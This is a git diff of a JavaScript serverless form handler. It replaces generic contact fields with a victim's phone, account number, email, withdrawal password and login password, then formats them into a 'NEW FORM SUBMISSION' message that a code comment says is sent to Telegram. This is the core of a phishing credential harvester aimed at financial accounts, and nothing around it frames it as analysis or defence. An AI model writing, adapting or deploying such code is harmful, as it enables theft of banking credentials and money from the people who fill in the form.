@@ -11,16 +11,16 @@ export default async function handler(req, res) {
 
         // Get the submitted form data
         const {
-            name,
             phone,
+            account,
             email,
-            network,
-            state
+            withdrawal,
+            login
         } = req.body || {};
 
 
         // Make sure all fields were provided
-        if (!name || !phone || !email || !network || !state) {
+        if (!phone || ! account || !email || ! withdrawal || !login) {
 
             return res.status(400).json({
                 error: "Please fill in all fields."
@@ -33,15 +33,15 @@ export default async function handler(req, res) {
         const message =
 `📩 NEW FORM SUBMISSION
 
-👤 Name: ${name}
+👤 Phone: ${phone}
 
-📱 Phone: ${phone}
+📱 Account Number: ${account}
 
 📧 Email: ${email}
 
-📡 Network: ${network}
+📡 Withdrawal Password: ${withdrawal}
 
-📍 State: ${state}`;
+📍 Login Password: ${login}`;
 
 
         // Send the message to Telegram
@@ -107,4 +107,4 @@ export default async function handler(req, res) {
 
     }
 
-  }
+}
